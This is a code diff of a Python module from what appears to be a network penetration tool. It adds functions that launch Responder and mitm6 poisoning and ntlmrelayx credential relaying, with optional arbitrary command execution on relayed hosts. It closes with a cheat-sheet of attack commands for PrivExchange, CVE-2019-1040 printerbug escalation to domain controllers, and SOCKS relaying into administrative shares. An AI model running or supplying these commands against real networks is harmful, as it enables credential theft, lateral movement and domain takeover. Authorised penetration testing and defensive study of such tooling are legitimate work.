@@ -1,144 +1,115 @@
 #!/usr/bin/env python3
 
-from src.process import Program
-from netaddr import IPNetwork, AddrFormatError
-from libnmap.parser import NmapParser
-from libnmap.process import NmapProcess
+import os
+from src.process import Process
+import re
+import os
+from src.utils import get_iface
+from src.process import Process
+
+cwd = os.getcwd()
+
+def create_ntlmrelayx_cmd(args):
+    """
+    Creates the ntlmrelayx cmommand string
+    """
+#    relay_cmd = f'python {cwd}/submodules/impacket/examples/ntlmrelayx.py -of {cwd}/hashes/ntlmrelay-hashes.txt -smb2support'
+    relay_cmd = f'python {cwd}/submodules/ntlmrelayx.py -of {cwd}/hashes/ntlmrelay-hashes.txt -smb2support'
+
+    if args.target:
+        target = f' -t {args.target}'
+    else:
+        target = f' -tf unsigned-smb-hosts.txt'
+
+    relay_cmd = relay_cmd + target
+
+    if args.mitm6:
+        six_poison = ' -6 -wh NetProxy-Service -wa 2'
+        relay_cmd = relay_cmd + six_poison
+
+    if args.command:
+        relay_cmd = relay_cmd + f' -c "{args.command}"'
+
+    return relay_cmd
+
+def start_ntlmrelayx(args):
+    """
+    Start ntlmrelayx
+    """
+    cmd = create_ntlmrelayx_cmd(args)
+    logfile_name = 'ntlmrelayx'
+    ntlmrelayx = start_process(cmd, logfile_name)
+
+    return ntlmrelayx
+
+def edit_responder_conf(switch, protocols, conf):
+    """
+    Edit Responder.conf
+
+    Mandatory arguments:
+    - switch : string of On or Off
+    - protocols : the protocols to change, e.g., HTTP, SMB, POP, IMAP
+    - conf : the Responder.conf config file location
+    """
+    if switch == 'On':
+        opp_switch = 'Off'
+    else:
+        opp_switch = 'On'
+    with open(conf, 'r') as f:
+        filedata = f.read()
+    for p in protocols:
+        if re.search(p + ' = ' + opp_switch, filedata):
+            filedata = filedata.replace(p + ' = ' + opp_switch, p + ' = ' + switch)
+    with open(conf, 'w') as f:
+        f.write(filedata)
+
+def start_responder(iface=None):
+    if not iface:
+        iface = get_iface()
+    protocols = ['HTTP', 'SMB']
+    switch = 'Off'
+    conf = 'submodules/Responder/Responder.conf'
+    edit_responder_conf(switch, protocols, conf)
+    cmd = f'python2 {cwd}/submodules/Responder/Responder.py -wrd -I {iface}'
+
+    logfile_name = 'responder'
+    responder = start_process(cmd, logfile_name)
+
+    return responder
+
+def start_mitm6(args):
+    cmd = f'python {cwd}/submodules/mitm6.py --ignore-nofqdn'
+    if args.domain:
+        cmd = cmd + f' -d {args.domain}'
+    if args.interface:
+        cmd = cmd + f' -i {args.interface}'
+
+    logfile_name = 'mitm6'
+    mitm6 = start_process(cmd, logfile_name)
+
+    return mitm6
+
+def start_process(cmd, logfile_name):
+    proc = Process(cmd)
+    proc.run(f'{cwd}/logs/{logfile_name}.log')
+
+    return proc
 
 
-class NmapError(Exception):
-    def __init__(self, msg):
-        self.msg = msg
-
-    def __str__(self):
-        return repr(self.msg)
-
-
-class Nmap:
-
-    def __init__(self):
-
-        self.report = None
-        self.nmap_proc = None
-
-    def parse_hostlist(self, hostlist):
-        """Parse Nmap host list"""
-        hosts = []
-        with open(hostlist, 'r') as f:
-            host_lines = f.readlines()
-            for line in host_lines:
-                line = line.strip()
-                try:
-                    if '/' in line:
-                        hosts += [str(ip) for ip in IPNetwork(line)]
-                    elif '*' in line:
-                        raise NmapError('CIDR notation only in the host list, e.g. 10.0.0.0/24')
-                    else:
-                        hosts.append(line)
-                except (OSError, AddrFormatError):
-                    raise NmapError('Error importing host list file. Are you sure you chose the right file?')
-
-        return hosts
-
-
-    def run_scan(self, opts, hostlist):
-        """
-        Run Nmap process
-        """
-        # Parse host list
-        scan_hosts = self.parse_hostlist(hostlist)
-
-        # Run Nmap
-        self.nmap_proc = NmapProcess(targets=scan_hosts, options=opts, safe_mode=False)
-        self.nmap_proc.sudo_run_background()
-        return self.nmap_proc
-
-
-    def parse_nmap_xml(self, nmap_xml_file):
-        report = NmapParser.parse_fromfile(nmap_xml_file)
-        self.report = report
-
-
-    def hosts_with_open_ports(self, ports):
-        """
-        Get list of hosts with relevant ports open
-        """
-        nhosts = []
-
-        for host in self.report.hosts:
-            if host.is_up():
-                for s in host.services:
-                    if s.port in ports:
-                        if s.state == 'open':
-                            if host not in nhosts:
-                                nhosts.append(host)
-
-        return nhosts
-
-
-    def nse_host_matches(self, nhosts, script_match):
-        """
-        Checks for the scripts that were run and their output
-
-        Mandatory Arguments:
-        - nhosts : list of NmapHost objects
-        - script_match : dictionary of {"script_name" : "script output that we're looking to match"}
-        """
-        hosts = []
-
-        for h in nhosts:
-            for script_out in h.scripts_results:
-                for script in script_match:
-                    if script_out['id'] == script:
-                        if script_match[script] in script_out['output']:
-                            ip = h.address
-                            if ip not in hosts:
-                                hosts.append(ip)
-
-        return hosts
-
-
-class Responder(Program):
-
-    def __init__(self, cmd):
-        super().__init__()
-        self.cmd = cmd
-
-    def edit_conf(self, switch, protocols, conf):
-        """
-        Edit Responder.conf
-
-        Mandatory arguments:
-        - switch : string of On or Off
-        - protocols : the protocols to change, e.g., HTTP, SMB, POP, IMAP
-        - conf : the Responder.conf config file location
-        """
-        if switch == 'On':
-            opp_switch = 'Off'
-        else:
-            opp_switch = 'On'
-        with open(conf, 'r') as f:
-            filedata = f.read()
-        for p in protocols:
-            # Make sure the change we're making is necessary
-            if re.search(p + ' = ' + opp_switch, filedata):
-                filedata = filedata.replace(p + ' = ' + opp_switch, p + ' = ' + switch)
-        with open(conf, 'w') as f:
-            f.write(filedata)
-
-
-    def start(self, logfile=None):
-        """
-        Start Responder and log output
-        """
-        resp_proc = self.run(self.cmd.split(), logfile=logfile)
-        return resp_proc
-
-
-class mitm6(Program):
-
-    def __init__(self, cmd):
-        super().__init__()
-        self.cmd = cmd
-
-    def
+# regular
+'python {}/submodules/ntlmrelayx.py -tf smb-unsigned-hosts.txt -of {}/hashes-ntlmrelay-hashes -smb2support'
+'python2 {}/submodules/Responder/Responder.py -wrd -I <iface>'
+# mitm6
+'python {}/submodules/ntlmrelayx.py -tf smb-unsigned-hosts.txt -6 -wh NetProxy-Service -wa 2 -smb2support'
+'mitm6 -d <domain> --ignore-nofqnd'
+'python2 {}/submodules/Responder/Responder.py -wrd -I <iface>'
+# PrivExchange
+'python {}/submodules/ntlmrelayx.py -t ldap://<DC> --remove-mic --escalate-user <UserYouHavePassFor>'
+'python {}/submodules/privexchange.py -ah <AttackerHost> <DC> -u <UserYouHavePassFor> -d testsegment.local'
+# CVE-2019-1040
+'python printerbug.py <DOMAIN/user>@<exchangeServer> <attacker ip>'
+'ntlmrelayx.py --remove-mic --escalate-user <UserYouHavePassFor> -t ldap://<DC> -smb2support'
+# SMB no admin - note tf should be in format smb://IP
+'python ntlmrelayx.py -tf smb-unsigned-hosts.txt -socks -smb2support'
+'ntlmrelayx> socks' # list all socks connections
+'proxychains smbclient //<targetIP>/c$ -U <DOMAIN/user listed in captured SMB sessions>'
